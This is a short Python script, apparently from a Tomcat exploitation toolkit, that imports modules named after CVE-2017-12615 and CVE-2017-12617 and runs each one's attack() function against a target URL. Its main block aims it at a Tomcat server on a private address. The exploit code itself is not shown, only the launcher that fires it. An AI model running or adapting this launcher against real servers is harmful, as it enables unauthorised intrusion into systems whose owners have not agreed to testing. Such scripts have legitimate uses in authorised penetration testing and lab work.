# -*- coding: utf-8 -*-
import os
import tomcat.CVE_2017_12615
import tomcat.example_vulnerability
import tomcat.CVE_2017_12617


def exec(URL):
    tomcat.CVE_2017_12615.attack(URL)
    tomcat.CVE_2017_12617.attack(URL)
    tomcat.example_vulnerability.attack(URL)




if __name__ == "__main__":
    exec('http://192.168.3.225:8080')
